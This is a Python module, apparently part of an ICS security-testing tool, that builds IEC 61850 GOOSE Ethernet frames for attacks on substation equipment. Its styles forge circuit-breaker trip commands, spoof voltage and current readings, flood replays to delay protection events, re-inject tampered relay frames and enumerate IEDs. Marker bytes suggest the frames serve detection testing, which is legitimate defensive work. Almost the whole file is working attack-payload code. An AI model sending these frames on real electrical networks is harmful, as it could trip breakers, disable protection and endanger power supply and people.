"""ICSForge IEC 61850 GOOSE payload builder.

IEC 61850 is the international standard for communication in electrical substations.
GOOSE (Generic Object-Oriented Substation Events) is its time-critical L2 multicast
protocol used for circuit breaker trip/close commands and protection relay events.

Wire format (IEC 61850-8-1):
  Ethernet:  01:0C:CD:01:xx:xx  (GOOSE protection multicast)
  EtherType: 0x88B8
  Header:    APPID(2) + Length(2) + Reserved1(2) + Reserved2(2)
  APDU:      BER-encoded IECGoosePdu (ASN.1 Application 1)

GOOSE PDU fields (BER context-specific implicit tags):
  [0]  gocbRef          VisibleString  GOOSE control block reference
  [1]  timeAllowedToLive INTEGER       max time between retransmissions (ms)
  [2]  datSet           VisibleString  dataset reference
  [3]  goID             VisibleString  GOOSE identifier
  [4]  t                UtcTime(8B)    timestamp
  [5]  stNum            INTEGER        state change counter (↑ on event)
  [6]  sqNum            INTEGER        retransmit sequence within a state
  [7]  test             BOOLEAN        test flag (false in live operation)
  [8]  confRev          INTEGER        configuration revision
  [9]  ndsCom           BOOLEAN        needs commissioning
  [10] numDatSetEntries INTEGER        count of allData entries
  [11] allData          SEQUENCE       actual data values (constructed, 0xAB)

Styles and ATT&CK for ICS mappings:
  trip_inject      — T0855 Unauthorized Command Message
  spoof_measurement— T0856 Spoof Reporting Message
  protection_block — T0813 Denial of Control  (GOOSE replay flooding)
  relay_inject     — T0830 Adversary-in-the-Middle
"""

import random
import struct
import time

from .common import marker_bytes, _src_mac_from_ip

# ── GOOSE multicast MACs (IEC 61850-8-1 Annex C) ─────────────────────────────
_GOOSE_DST_PROTECTION = bytes([0x01, 0x0C, 0xCD, 0x01, 0x00, 0x01])  # class 1/2
_GOOSE_DST_GENERIC    = bytes([0x01, 0x0C, 0xCD, 0x01, 0x00, 0x00])  # generic
_GOOSE_ETHERTYPE      = struct.pack(">H", 0x88B8)

# ── BER helpers ───────────────────────────────────────────────────────────────

def _ber_len(n: int) -> bytes:
    """BER length encoding (indefinite form not used)."""
    if n < 0x80:
        return bytes([n])
    if n < 0x100:
        return bytes([0x81, n])
    return bytes([0x82, (n >> 8) & 0xFF, n & 0xFF])


def _ber_int(n: int) -> bytes:
    """Minimal big-endian BER integer encoding."""
    if n == 0:
        return b"\x00"
    result: list[int] = []
    tmp = n if n >= 0 else ~n
    while tmp:
        result.append(tmp & 0xFF)
        tmp >>= 8
    if n >= 0 and result[-1] & 0x80:
        result.append(0x00)
    result.reverse()
    return bytes(result)


def _ber_utctime(rnd: random.Random) -> bytes:
    """8-byte IEC 61850 UTC time: 4B seconds, 3B fraction, 1B quality."""
    ts = int(time.time())
    frac = int(rnd.randint(0, 999_999_999) * 16.777) & 0xFFFFFF
    sec_b = struct.pack(">I", ts)
    frac_b = struct.pack(">I", frac)[1:]      # 3 bytes
    quality = 0x0A                             # accuracy ≤ 10 ns
    return sec_b + frac_b + bytes([quality])


def _tlv(tag: int, val: bytes) -> bytes:
    return bytes([tag]) + _ber_len(len(val)) + val


# ── allData type helpers ──────────────────────────────────────────────────────

def _data_bool(v: bool) -> bytes:
    """BOOLEAN data entry (tag 0x83)."""
    return _tlv(0x83, b"\xff" if v else b"\x00")


def _data_float32(f: float) -> bytes:
    """FLOAT32 data entry (tag 0x87): 1-byte exponent-width + 4-byte IEEE 754."""
    return _tlv(0x87, b"\x08" + struct.pack(">f", f))


def _data_int32(n: int) -> bytes:
    """INT32 data entry (tag 0x85)."""
    return _tlv(0x85, struct.pack(">i", n))


def _data_bitstring(bits: bytes, unused: int = 0) -> bytes:
    """BIT STRING data entry (tag 0x84)."""
    return _tlv(0x84, bytes([unused]) + bits)


# ── GOOSE PDU builder ─────────────────────────────────────────────────────────

def _goose_pdu(
    gocb_ref: str,
    dat_set: str,
    go_id: str,
    st_num: int,
    sq_num: int,
    conf_rev: int,
    data_items: list[bytes],
    rnd: random.Random,
    time_allowed: int = 4000,
    test: bool = False,
) -> bytes:
    """Encode IECGoosePdu as BER (Application class 1, constructed)."""
    all_data_raw = b"".join(data_items)
    t_bytes = _ber_utctime(rnd)

    body = (
        _tlv(0x80, gocb_ref.encode("ascii"))
        + _tlv(0x81, _ber_int(time_allowed))
        + _tlv(0x82, dat_set.encode("ascii"))
        + _tlv(0x83, go_id.encode("ascii"))
        + _tlv(0x84, t_bytes)
        + _tlv(0x85, _ber_int(st_num))
        + _tlv(0x86, _ber_int(sq_num))
        + _tlv(0x87, b"\xff" if test else b"\x00")
        + _tlv(0x88, _ber_int(conf_rev))
        + _tlv(0x89, b"\x00")
        + _tlv(0x8A, _ber_int(len(data_items)))
        + b"\xAB" + _ber_len(len(all_data_raw)) + all_data_raw
    )
    return b"\x61" + _ber_len(len(body)) + body


# ── Ethernet frame wrapper ────────────────────────────────────────────────────

def _goose_frame(
    goose_pdu: bytes,
    rnd: random.Random,
    appid: int = 0x0004,
    dst_mac: bytes = _GOOSE_DST_PROTECTION,
) -> bytes:
    """Wrap GOOSE PDU in a complete Ethernet II frame."""
    # Use registered IEC 61850 vendor OUI (GE/ABB) — no locally-administered bit
    src_mac = _src_mac_from_ip("10.0.0.1", proto="iec61850")  # relay-style MAC
    l2_hdr = struct.pack(">HH", appid, 8 + len(goose_pdu)) + b"\x00\x00\x00\x00"
    frame = dst_mac + src_mac + _GOOSE_ETHERTYPE + l2_hdr + goose_pdu
    if len(frame) < 60:
        frame += b"\x00" * (60 - len(frame))
    return frame


# ── Public API ────────────────────────────────────────────────────────────────

def build_payload(marker: str | bytes, style: str = "trip_inject", **kwargs) -> bytes:
    """
    Build a complete IEC 61850 GOOSE Ethernet frame.

    Styles:
      trip_inject       — T0855 Unauthorized circuit breaker trip injection
      spoof_measurement — T0856 Spoofed voltage/current GOOSE report
      protection_block  — T0813 Denial of control via GOOSE replay flooding
      relay_inject      — T0830 AitM GOOSE relay with modified data
    """
    rnd = random.Random(kwargs.get("seed"))
    mb = marker_bytes(marker)

    # Configurable parameters
    ied_ref    = str(kwargs.get("ied_ref",    "IED1LD0/LLN0"))
    gcb_suffix = str(kwargs.get("gcb_suffix", "GCB01"))
    gocb_ref   = f"{ied_ref}$GO${gcb_suffix}"
    dat_set    = f"{ied_ref}$PROT"
    go_id      = gocb_ref
    conf_rev   = int(kwargs.get("conf_rev", 1))
    appid      = int(kwargs.get("appid", 0x0004))

    # ── trip_inject ───────────────────────────────────────────────────────────
    if style == "trip_inject":
        # Attacker injects GOOSE trip command with abnormally high stNum
        # (higher than legitimate IED's running value — causes IEDs to accept it
        # as a genuine state change and execute the circuit breaker trip).
        st_num = int(kwargs.get("st_num", rnd.randint(5000, 9999)))
        sq_num = int(kwargs.get("sq_num", 0))
        # allData: [BOOLEAN trip=TRUE, BOOLEAN protection-status=TRUE]
        data_items = [_data_bool(True), _data_bool(True)]
        pdu = _goose_pdu(gocb_ref, dat_set, go_id, st_num, sq_num,
                         conf_rev, data_items, rnd)
        return _goose_frame(pdu, rnd, appid) + mb

    # ── spoof_measurement ─────────────────────────────────────────────────────
    elif style == "spoof_measurement":
        # Inject GOOSE with falsified voltage/current readings.
        # Operator and protection relays see incorrect values.
        st_num   = int(kwargs.get("st_num", rnd.randint(100, 500)))
        sq_num   = int(kwargs.get("sq_num", 0))
        voltage  = float(kwargs.get("voltage",  0.0))      # 0V = dead feeder
        current  = float(kwargs.get("current",  rnd.uniform(0.0, 5.0)))
        data_items = [
            _data_float32(voltage),
            _data_float32(current),
            _data_bool(False),   # trip status = normal
        ]
        pdu = _goose_pdu(gocb_ref, dat_set, go_id, st_num, sq_num,
                         conf_rev, data_items, rnd)
        return _goose_frame(pdu, rnd, appid) + mb

    # ── protection_block ──────────────────────────────────────────────────────
    elif style == "protection_block":
        # Rapid GOOSE replay flooding — sqNum increments continuously at the
        # same stNum. Saturates IED message queues; real protection events
        # are delayed or lost (denial of control via buffer exhaustion).
        st_num = int(kwargs.get("st_num", rnd.randint(1, 50)))
        sq_num = int(kwargs.get("sq_num", rnd.randint(0, 200)))
        data_items = [_data_bool(False), _data_float32(rnd.uniform(220.0, 240.0))]
        pdu = _goose_pdu(gocb_ref, dat_set, go_id, st_num, sq_num,
                         conf_rev, data_items, rnd, time_allowed=1000)
        return _goose_frame(pdu, rnd, appid) + mb

    # ── relay_inject ──────────────────────────────────────────────────────────
    elif style == "relay_inject":
        # Adversary-in-the-Middle: attacker captures a legitimate GOOSE frame
        # from a publisher IED, modifies the payload (e.g., flips a trip bit
        # or changes a measured value), and re-injects with stNum = captured + 1.
        # Receivers prefer the frame with the higher stNum.
        relay_src   = str(kwargs.get("relay_src", "IED2LD0/LLN0"))
        relay_gocb  = f"{relay_src}$GO${gcb_suffix}"
        relay_datset = f"{relay_src}$PROT"
        st_num = int(kwargs.get("st_num", rnd.randint(500, 1500))) + 1
        sq_num = 0
        # Modified data: trip = TRUE (attacker changed close→trip)
        data_items = [_data_bool(True), _data_float32(rnd.uniform(200.0, 230.0))]
        pdu = _goose_pdu(relay_gocb, relay_datset, relay_gocb, st_num, sq_num,
                         conf_rev, data_items, rnd)
        return _goose_frame(pdu, rnd, appid, dst_mac=_GOOSE_DST_GENERIC) + mb


    # ── enumerate_ied ─────────────────────────────────────────────────────────
    elif style == "enumerate_ied":
        # Sends GOOSE with test=True flag to the generic multicast address.
        # IEDs that receive test-mode GOOSE do not act on the data; their
        # presence on the bus is observable. Used for IED discovery/mapping
        # without triggering protection actions. stNum stays low (non-threatening).
        st_num = int(kwargs.get("st_num", rnd.randint(1, 10)))
        sq_num = int(kwargs.get("sq_num", 0))
        data_items = [_data_bool(False)]
        pdu = _goose_pdu(gocb_ref, dat_set, go_id, st_num, sq_num,
                         conf_rev, data_items, rnd, test=True)
        return _goose_frame(pdu, rnd, appid, dst_mac=_GOOSE_DST_GENERIC) + mb

    # ── fallback ──────────────────────────────────────────────────────────────
    else:
        # Default: benign keep-alive GOOSE (stNum=1, sqNum=0, trip=false)
        data_items = [_data_bool(False)]
        pdu = _goose_pdu(gocb_ref, dat_set, go_id, 1, 0, conf_rev,
                         data_items, rnd)
        return _goose_frame(pdu, rnd, appid) + mb
